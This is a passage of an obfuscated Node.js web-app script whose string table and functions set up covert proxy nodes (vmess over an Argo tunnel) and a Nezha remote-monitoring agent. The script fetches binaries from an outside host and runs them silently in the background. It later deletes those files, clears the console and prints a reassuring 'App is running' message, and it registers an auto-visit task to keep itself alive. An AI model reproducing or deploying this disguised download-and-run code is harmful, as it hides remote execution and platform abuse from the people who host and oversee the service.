    'abcdefghijklmnopqrstuvwxyz',
    'Unknown',
    '\x20-c\x20',
    'get',
    '/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:',
    '127.0.0.1',
    'stringify',
    'quic',
    'win32',
    'random',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    'config.json',
    'vmess',
    'Error\x20downloading\x20files:',
    'NEZHA_KEY',
    '\x20failed:\x20',
    'http',
    'toString',
    'text/plain;\x20charset=utf-8',
    '\x20-c\x20\x22',
    'Content-Type',
    '\x20>/dev/null\x202>&1\x20&',
    'substring',
    '2053',
    'set',
    'message',
    '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20',
    'chmod',
    'http://ip-api.com/json',
    'Empowerment\x20success\x20for\x20',
    '&fp=firefox&type=ws&host=',
    '/api/delete-nodes',
    'error',
    'has',
    'log',
    'unlinkSync',
    'firefox',
    'https://amd64.ssss.nyc.mn/web',
    '.tmp',
    'pkill\x20-f\x20\x22[',
    '\x20-p\x20',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20',
    'existsSync',
    'split',
    'success',
    '83622QommBp',
    'test',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20'
  ]
  _0x6a5f = function () {
    return _0xca97c
  }
  return _0x6a5f()
}
function cleanFiles() {
  setTimeout(() => {
    const _0x1f0d8f = _0x3229,
      _0x473739 = [bootLogPath, configPath, webPath, botPath]
    if (NEZHA_PORT) _0x473739[_0x1f0d8f(0x139)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x473739['push'](phpPath)
    process[_0x1f0d8f(0x138)] === _0x1f0d8f(0xe7)
      ? exec(_0x1f0d8f(0x168) + _0x473739[_0x1f0d8f(0x16c)]('\x20') + _0x1f0d8f(0x144), (_0x2d8536) => {
          const _0x54f41d = _0x1f0d8f
          ;(console['clear'](), console[_0x54f41d(0x101)]('App\x20is\x20running'), console[_0x54f41d(0x101)](_0x54f41d(0x124)))
        })
      : exec(_0x1f0d8f(0x13c) + _0x473739['join']('\x20') + '\x20>/dev/null\x202>&1', (_0x86f1b2) => {
          const _0x5a3097 = _0x1f0d8f
          ;(console['clear'](), console[_0x5a3097(0x101)]('App\x20is\x20running'), console[_0x5a3097(0x101)](_0x5a3097(0x124)))
        })
  }, 0x15f90)
}
cleanFiles()
async function AddVisitTask() {
  const _0x316136 = _0x364ccd
  if (!AUTO_ACCESS || !PROJECT_URL) {
    console['log'](_0x316136(0x114))
    return
  }
  try {
    const _0x182a80 = await axios['post'](_0x316136(0x17d), { url: PROJECT_URL }, { headers: { 'Content-Type': _0x316136(0x198) } })
    return (console[_0x316136(0x101)](_0x316136(0x113)), _0x182a80)
  } catch (_0x24b6f6) {
    return (console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20' + _0x24b6f6['message']), null)
  }
}
async function startserver() {
  const _0x126f5d = _0x364ccd
  try {
    ;(argoType(), deleteNodes(), cleanupOldFiles(), await generateConfig(), await downloadFilesAndRun(), await extractDomains(), await AddVisitTask())
  } catch (_0x1ac8b1) {
    console[_0x126f5d(0xff)](_0x126f5d(0x18e), _0x1ac8b1)
  }
}
;(startserver()[_0x364ccd(0x17a)]((_0x2f0ec6) => {
  const _0x18dfdb = _0x364ccd
  console['error'](_0x18dfdb(0x192), _0x2f0ec6)
}),
  app[_0x364ccd(0xe2)]('/', async function (_0x208b0d, _0x225b2e) {
    const _0x25ef74 = _0x364ccd
    try {
      const _0xda48a4 = path[_0x25ef74(0x16c)](__dirname, 'index.html'),
        _0xb84c7b = await fs['promises'][_0x25ef74(0x12e)](_0xda48a4, _0x25ef74(0x128))
      _0x225b2e[_0x25ef74(0x14e)](_0xb84c7b)
    } catch (_0x4bc815) {
      _0x225b2e[_0x25ef74(0x14e)]('Service\x20is\x20runing!<br><br>You\x20can\x20visit\x20/{SUB_PATH}(Default:\x20/sub)\x20get\x20your\x20nodes!')
    }
  }),
  app['listen'](PORT, () => console[_0x364ccd(0x101)](_0x364ccd(0x13a) + PORT + '!')))
